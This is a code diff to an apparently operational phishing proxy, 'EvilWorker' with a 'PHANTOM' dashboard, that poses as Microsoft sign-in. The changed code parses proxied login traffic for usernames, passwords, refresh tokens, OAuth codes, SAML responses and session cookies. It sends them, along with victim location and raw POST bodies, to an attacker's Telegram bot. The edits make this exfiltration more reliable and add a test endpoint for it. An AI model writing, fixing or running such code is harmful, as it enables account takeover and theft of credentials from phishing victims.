@@ -91,7 +91,7 @@ async function sendCookiesAsFile(cookies, sessionId) {
 }
 
 // ================================================
-// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (FIXED: Only username+password or session cookie)
+// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (FULLY FIXED)
 // ================================================
 
 async function sendToTelegram(data) {
@@ -102,8 +102,11 @@ async function sendToTelegram(data) {
         const sessionId = data.sessionId || 'unknown';
         const userAgent = data.proxyRequestHeaders?.['user-agent'] || 'Unknown';
         
+        console.log('📨 sendToTelegram() CALLED with URL:', url);
+        
         // ────── CHECK IF ALREADY NOTIFIED ──────
         if (NOTIFIED_SESSIONS.has(sessionId)) {
+            console.log('⏭️ Already notified for session:', sessionId);
             return;
         }
         
@@ -123,33 +126,25 @@ async function sendToTelegram(data) {
             const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
             
             // ── MICROSOFT SPECIFIC PATTERNS ──
-            // Pattern 1: login? (username only on first step)
             const userMatch = bodyStr.match(/(?:login|loginfmt|username)=([^&]+)/i);
             if (userMatch) {
                 username = decodeURIComponent(userMatch[1]);
-                // Don't set hasCredentials yet — wait for password
             }
             
-            // Pattern 2: Password in second step
             const passMatch = bodyStr.match(/(?:passwd|password|pass)=([^&]+)/i);
             if (passMatch) {
                 password = decodeURIComponent(passMatch[1]);
-                // If we have both from different requests, we'll combine later
-                // For now, flag that we have at least one credential
                 hasCredentials = true;
             }
             
-            // Pattern 3: Token exchange (refresh_token grant)
             if (bodyStr.includes('refresh_token') && bodyStr.includes('grant_type')) {
                 isTokenExchange = true;
                 const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                 if (refreshMatch) {
-                    // This is a token refresh — highly valuable
                     hasCredentials = true;
                 }
             }
             
-            // Pattern 4: OAuth2 token endpoint (code exchange)
             if (bodyStr.includes('code=') && bodyStr.includes('client_id=')) {
                 isTokenExchange = true;
                 hasCredentials = true;
@@ -159,7 +154,6 @@ async function sendToTelegram(data) {
                 }
             }
             
-            // Pattern 5: SAML assertion (federated login)
             if (bodyStr.includes('SAMLResponse') || bodyStr.includes('SAMLRequest')) {
                 hasCredentials = true;
                 const samlMatch = bodyStr.match(/SAMLResponse=([^&]+)/i);
@@ -178,7 +172,7 @@ async function sendToTelegram(data) {
                 cookieStr.includes('LoginOptions') ||
                 cookieStr.includes('.AspNetCore')) {
                 isSessionCookie = true;
-                hasCredentials = true; // Session cookie is as good as credentials
+                hasCredentials = true;
             }
         }
         
@@ -198,11 +192,14 @@ async function sendToTelegram(data) {
         
         // ────── SKIP IF NOTHING VALUABLE ──────
         if (!hasCredentials) {
+            console.log('⏭️ Skipping notification - no credentials found in:', url);
             return;
         }
         
-        // ────── MARK AS NOTIFIED (only if we're actually sending) ──────
-        // We'll mark it after we send to avoid duplicates in case of failure
+        console.log('✅ Valid credentials found, sending notification...');
+        
+        // ────── MARK AS NOTIFIED ──────
+        NOTIFIED_SESSIONS.add(sessionId);
         
         let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
         let flag = '🌍';
@@ -262,11 +259,13 @@ ${flag} **Location:** ${location}
         }
 
         // ────── SEND TELEGRAM ──────
+        console.log('📤 Sending Telegram message...');
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
             parse_mode: 'Markdown'
         });
+        console.log('✅ Telegram message sent successfully');
 
         // ────── SEND COOKIES AS FILE ──────
         const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
@@ -274,10 +273,7 @@ ${flag} **Location:** ${location}
             await sendCookiesAsFile(cookies, sessionId);
         }
 
-        // ────── MARK AS NOTIFIED ──────
-        NOTIFIED_SESSIONS.add(sessionId);
-
-        // ────── ALSO SEND A SEPARATE SHORT MESSAGE WITH THE RAW DATA ──────
+        // ────── ALSO SEND RAW DATA ──────
         if (body && typeof body === 'string' && body.length > 0 && body.length < 4000) {
             try {
                 await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -285,11 +281,15 @@ ${flag} **Location:** ${location}
                     text: `📦 **Raw POST Data:**\n\`\`\`\n${body.slice(0, 3000)}\n\`\`\``,
                     parse_mode: 'Markdown'
                 });
-            } catch (e) {}
+                console.log('✅ Raw data sent successfully');
+            } catch (e) {
+                console.log('⚠️ Raw data send failed:', e.message);
+            }
         }
 
     } catch (e) {
-        console.log('Telegram send failed', e.message);
+        console.error('❌ Telegram send failed:', e.message);
+        console.error('   Stack:', e.stack);
         // Don't mark as notified on failure so we retry later
     }
 }
@@ -307,7 +307,7 @@ const crypto = require("crypto");
 const os = require("os");
 
 // ================================================
-// 𝚅𝙸𝚂𝙸𝚃 𝙻𝙾𝙶𝙶𝙸𝙽𝙶 (FIXED: Only log page loads)
+// 𝚅𝙸𝚂𝙸𝚃 𝙻𝙾𝙶𝙶𝙸𝙽𝙶
 // ================================================
 
 const VISITS_LOG_FILE = path.join(__dirname, "visit_logs", "visits.log");
@@ -321,7 +321,6 @@ async function logVisit(clientRequest, clientResponse, sessionId) {
     const url = clientRequest.url || '';
     const method = clientRequest.method || '';
     
-    // ────── ONLY LOG PAGE LOADS ──────
     const isPageLoad = (
         method === 'GET' &&
         (url === '/' || 
@@ -331,14 +330,13 @@ async function logVisit(clientRequest, clientResponse, sessionId) {
          url.match(/\.(html|htm)$/))
     );
     
-    // ────── SKIP STATIC ASSETS AND SERVICE WORKER ──────
     const isStatic = (
         url.includes('.css') || url.includes('.js') || 
         url.includes('.gif') || url.includes('.svg') || 
         url.includes('.ico') || url.includes('.png') ||
         url.includes('service_worker') || url.includes('/@') ||
         url.includes('favicon') || url.includes('OneCollector') ||
-        url.includes('/lNv1pC9AWPUY4gbidyBO') // Proxy path
+        url.includes('/lNv1pC9AWPUY4gbidyBO')
     );
     
     if (!isPageLoad || isStatic) {
@@ -382,7 +380,7 @@ const AdmZip = require('adm-zip');
 const WebSocket = require('ws');
 
 // ================================================
-// 𝙲𝙾𝙼𝙼𝙾𝙽 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂
+// 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂
 // ================================================
 
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
@@ -423,7 +421,7 @@ function decryptData(encryptedData, ivHex) {
 }
 
 // ================================================
-// 𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙰𝙿𝙿 
+// 𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙰𝙿𝙿
 // ================================================
 
 const dashApp = express();
@@ -444,7 +442,7 @@ dashApp.get('/', (req, res) => {
 });
 
 // ================================================
-// 𝙰𝙿𝙸 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂 (Dashboard)
+// 𝙰𝙿𝙸 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂
 // ================================================
 
 dashApp.get('/api/logs', (req, res) => {
@@ -1143,6 +1141,24 @@ dashApp.post('/api/phishlets/toggle', (req, res) => {
     }
 });
 
+dashApp.post('/api/test-telegram', async (req, res) => {
+    try {
+        const testData = {
+            timestamp: new Date().toISOString(),
+            proxyRequestURL: 'https://login.microsoftonline.com/test',
+            proxyRequestMethod: 'GET',
+            proxyRequestHeaders: { 'user-agent': 'Test' },
+            proxyRequestBody: 'test=123',
+            proxyResponseStatusCode: 200,
+            proxyResponseHeaders: { 'set-cookie': ['test=value'] }
+        };
+        await sendToTelegram(testData);
+        res.json({ success: true, message: 'Test notification sent' });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
 // ================================================
 // 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁
 // ================================================
@@ -1402,7 +1418,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 });
 
 // ================================================
-// 𝙼𝙰𝙺𝙴 𝙿𝚁𝙾𝚇𝚈 𝚁𝙴𝚀𝚄𝙴𝚂𝚃
+// 𝙼𝙰𝙺𝙴 𝙿𝚁𝙾𝚇𝚈 𝚁𝙴𝚀𝚄𝙴𝚂𝚃 (FIXED: AWAIT + ERROR HANDLING)
 // ================================================
 
 const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
@@ -1600,7 +1616,20 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
     if (!logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`)) {
         await new Promise(resolve => logFileStream.once("drain", resolve));
     }
-        sendToTelegram(httpProxyTransaction);
+    
+    // ────── FIXED: AWAIT + ERROR HANDLING ──────
+    try {
+        await sendToTelegram(httpProxyTransaction);
+        console.log('✅ Telegram notification sent for:', proxyRequestOptions.path);
+    } catch (telegramError) {
+        console.error('❌ Telegram notification FAILED:', telegramError.message);
+        console.error('   URL:', httpProxyTransaction.proxyRequestURL);
+        // Log to error file
+        try {
+            fs.appendFileSync('telegram_errors.log', 
+                `[${new Date().toISOString()}] ${telegramError.message} | ${httpProxyTransaction.proxyRequestURL}\n`);
+        } catch (e) {}
+    }
 }
 
 function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
@@ -2105,6 +2134,7 @@ const PORT = process.env.PORT || 3000;
 const server = app.listen(PORT, () => {
     console.log(`✅ EvilWorker Proxy + PHANTOM Dashboard running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${dashUser}/${dashPass})`);
+    console.log(`📱 Telegram bot configured: ${BOT_TOKEN.slice(0, 10)}...`);
 });
 
 const wss = new WebSocket.Server({ server });
